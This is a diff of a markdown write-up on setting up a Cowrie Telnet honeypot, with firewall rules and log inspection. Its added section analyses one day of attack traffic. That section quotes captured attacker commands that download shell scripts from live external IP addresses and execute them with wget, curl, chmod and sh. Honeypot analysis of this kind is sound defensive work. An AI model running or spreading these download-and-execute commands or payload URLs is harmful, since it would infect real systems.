@@ -36,7 +36,7 @@ The deployment focuses on secure service isolation, controlled network exposure,
 
 Cowrie was installed in a dedicated directory:
 
-```
+``` bash
 /opt/cowrie
 ```
 
@@ -59,13 +59,6 @@ Cowrie was configured as a systemd service to provide automatic startup and cent
 
 The service runs under the dedicated `cowrie` account.
 
-The service status can be verified using:
-
-```
-sudo systemctl status cowrie
-```
-
-The service was successfully started and verified as active.
 
 ---
 
@@ -110,14 +103,14 @@ This allows the service to bind to TCP port `23` while retaining its unprivilege
 
 UFW was configured with a default-deny incoming policy and an allow-outgoing policy.
 
-```
+``` bash
 sudo ufw default deny incoming
 sudo ufw default allow outgoing
 ```
 
 Only the required TCP ports were allowed:
 
-```
+``` bash
 sudo ufw allow 22/tcp
 sudo ufw allow 23/tcp
 sudo ufw allow 2222/tcp
@@ -140,7 +133,7 @@ This provides an additional layer of containment against potential abuse of the 
 
 The active listening sockets were verified using:
 
-```
+``` bash
 sudo ss -lntp
 ```
 
@@ -153,7 +146,7 @@ The expected listeners were confirmed:
 
 External connectivity was tested from a Windows workstation using PowerShell:
 
-```
+``` powershell
 Test-NetConnection <VPS_IP> -Port 23
 Test-NetConnection <VPS_IP> -Port 2222
 ```
@@ -168,13 +161,14 @@ This confirmed that the Telnet service was reachable externally.
 
 ---
 
+
 ## Event Logging
 
 Cowrie stores generated events in JSON format.
 
 The primary log file is located at:
 
-```
+``` bash
 /opt/cowrie/var/log/cowrie/cowrie.json
 ```
 
@@ -193,13 +187,13 @@ The log contains structured information about honeypot activity, including:
 
 The log can be monitored in real time using:
 
-```
+``` bash
 sudo tail -f /opt/cowrie/var/log/cowrie/cowrie.json
 ```
 
 For structured event inspection, `jq` can be used:
 
-```
+``` bash
 sudo jq -c 'select(.eventid=="cowrie.login.success")' \
 /opt/cowrie/var/log/cowrie/cowrie.json
 ```
@@ -212,7 +206,7 @@ A test connection was established using PuTTY in Telnet mode.
 
 A simulated login session was successfully initiated, and several commands were entered:
 
-```
+``` bash
 pwd
 uname -a
 whoami
@@ -232,6 +226,64 @@ The generated events included:
 |`cowrie.session.closed`|Session terminated|
 
 The session was successfully captured in the JSON event log.
+
+---
+
+## Initial Telnet Exposure – 18 November 2026
+
+After exposing the Telnet honeypot on TCP port `23` to the public internet, I collected and analyzed the activity recorded by Cowrie on 18 November 2026.
+
+The analysis focused on incoming connections, authentication attempts, command execution patterns, and potential malware delivery attempts.
+
+### Connection Statistics
+
+During the observation period, Cowrie recorded **176 Telnet connections from 31 unique source IP addresses**.
+
+|Metric|Value|
+|---|---|
+|Total Telnet connections|176|
+|Unique source IP addresses|31|
+|Successful authentication events|72|
+|Failed authentication events|12|
+|Recorded file download failures|5|
+|Successful file download events|0|
+
+### Observed Attack Patterns
+
+Analysis of the recorded command inputs revealed several recurring activity patterns:
+
+- **BusyBox / embedded Linux activity:** Commands such as `/bin/busybox HISILICON` and attempts to access `/proc/self/exe` appeared repeatedly across multiple sessions.
+    
+- **Automated file creation attempts:** Repeated command sequences attempted to create files named `.f` in directories such as `/var`, `/tmp`, `/dev/shm`, `/root`, and `/usr`, followed by permission changes and execution attempts.
+    
+- **Shell access attempts:** Commands including `enable`, `system`, `sh`, `shell`, and `ping; sh` were observed during interactive sessions.
+    
+- **Payload download attempts:** Some sessions attempted to retrieve shell scripts from external HTTP servers.
+
+![screen](../images/cowrie-config/telnet24h.png)
+
+### Malware Delivery Attempts
+
+Five failed file download events were recorded during the analysis period.
+
+Two distinct payload URLs were identified:
+
+|Source IP|Requested File|
+|---|---|
+|`37.221.79.128`|`http://37.221.79.128/mentality.sh`|
+|`160.119.66.206`|`http://160.119.66.206/bins/kla.sh`|
+
+``` bash
+2026-11-18T19:55:20.168711Z     37.221.79.128   6f771cef2078    cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://37.221.79.128/mentality.sh; curl -O http://37.221.79.128/mentality.sh; chmod 777 mentality.sh; sh mentality.sh
+2026-11-18T21:25:20.869677Z     160.119.66.206  ac2ec4dd5ce5    cd /tmp 2>/dev/null || cd /var 2>/dev/null || cd /dev/shm 2>/dev/null || cd /run 2>/dev/null || cd /root 2>/dev/null || cd /;rm -f kla.sh;wget -O kla.sh http://160.119.66.206/bins/kla.sh 2>/dev/null||busybox wget -O kla.sh http://160.119.66.206/bins/kla.sh 2>/dev/null||curl -sLo kla.sh http://160.119.66.206/bins/kla.sh 2>/dev/null;chmod 777 kla.sh;sh kla.sh telnet&
+2026-11-18T21:25:21.073757Z     160.119.66.206  52475a18ac18    cd /tmp 2>/dev/null || cd /var 2>/dev/null || cd /dev/shm 2>/dev/null || cd /run 2>/dev/null || cd /root 2>/dev/null || cd /;rm -f kla.sh;wget -O kla.sh http://160.119.66.206/bins/kla.sh 2>/dev/null||busybox wget -O kla.sh http://160.119.66.206/bins/kla.sh 2>/dev/null||curl -sLo kla.sh http://160.119.66.206/bins/kla.sh 2>/dev/null;chmod 777 kla.sh;sh kla.sh telnet&
+
+```
+
+The associated commands attempted to download, change permissions, and execute the retrieved scripts.
+
+Cowrie recorded all five download events as `cowrie.session.file_download.failed`. No successful file download events were recorded.
+
 
 ---
 
